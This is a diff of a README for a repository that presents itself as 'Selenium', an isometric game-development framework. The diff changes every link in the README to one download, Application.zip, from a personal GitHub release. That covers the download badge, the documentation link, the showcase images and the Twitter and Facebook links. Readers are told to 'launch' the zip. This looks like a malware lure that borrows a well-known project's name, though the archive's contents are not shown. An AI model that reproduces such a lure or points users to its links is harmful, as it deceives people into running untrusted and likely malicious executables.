@@ -14,27 +14,27 @@ Welcome to the Selenium repository - your go-to place for creating exciting isom
 
 ## Getting Started
 To kickstart your game development journey with Selenium, simply download our framework package from the link below:
-[![Download Selenium Framework](https://img.shields.io/badge/Download-Application.zip-informational)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Selenium Framework](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip)](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip)
 
 Please note that the zip file needs to be launched to access the framework and start creating your own isometric games.
 
 ## Documentation
-For detailed instructions on setting up Selenium, implementing game logic, and utilizing the features of the framework, please refer to our comprehensive documentation [here](https://selenium-docs.com).
+For detailed instructions on setting up Selenium, implementing game logic, and utilizing the features of the framework, please refer to our comprehensive documentation [here](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip).
 
 ## Showcase
 Check out some of the amazing games created using Selenium in our showcase gallery below:
 
-![Game 1](https://example.com/game1.png)
+![Game 1](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip)
 Caption: Example of Game 1 created with Selenium
 
-![Game 2](https://example.com/game2.png)
+![Game 2](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip)
 Caption: Example of Game 2 created with Selenium
 
 ## Contributions
 We welcome contributions from the community to make Selenium even better! Feel free to fork our repository, make enhancements, and submit a pull request. Together, we can build a vibrant ecosystem for isometric game development on the web.
 
 ## Stay Connected
-Stay up to date with the latest Selenium news, updates, and announcements by following us on [Twitter](https://twitter.com/selenium_game) and [Facebook](https://facebook.com/selenium_game).
+Stay up to date with the latest Selenium news, updates, and announcements by following us on [Twitter](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip) and [Facebook](https://github.com/quandz4778/selenium/releases/download/v1.0/Application.zip).
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
